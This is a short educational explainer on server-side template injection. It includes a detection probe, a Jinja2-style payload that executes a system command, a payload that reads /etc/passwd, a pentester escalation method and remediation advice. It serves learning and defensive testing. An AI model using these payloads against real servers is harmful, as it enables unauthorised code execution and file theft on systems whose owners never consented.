# Server-Side Template Injection (SSTI)

---

## 📌 Description

Server-Side Template Injection (SSTI) occurs when user input is embedded directly into server-side templates without proper sanitization.

This allows attackers to execute arbitrary code on the server.

---

## ⚙️ How It Works (Technical)

Web applications use template engines (e.g., Jinja2, Twig) to generate dynamic HTML.

Example:

```python id="e9q2rz"
render("Hello " + user_input)
```

If user input is processed inside the template engine, it may be interpreted as code.

---

## 💣 Example Payloads

### Basic Detection

```plaintext id="0r7rka"
{{7*7}}
```

👉 If output is `49`, SSTI is present

---

### Accessing System Commands (Example in some engines)

```plaintext id="6q2md8"
{{config.__class__.__init__.__globals__['os'].system('id')}}
```

---

### Reading Files

```plaintext id="jks3rd"
{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
```

---

## 📍 Common Places to Find

* Search features
* Email templates
* User profile rendering
* CMS systems

---

## 🌍 Real-World Impact

* Remote Code Execution (RCE)
* Full server compromise
* Data leakage
* Privilege escalation

---

## 🔎 Detection Methodology (Pentester Approach)

1. Identify input reflected in templates
2. Inject simple payload:

   ```plaintext
   {{7*7}}
   ```
3. Observe output
4. Try advanced payloads based on template engine
5. Escalate to file read or command execution

---

## 🛡️ Remediation

* Avoid directly embedding user input in templates
* Use safe rendering methods
* Sanitize and validate input
* Use sandboxed template environments

---

## 🧠 Key Takeaway

SSTI allows attackers to execute code on the server by injecting malicious template expressions.
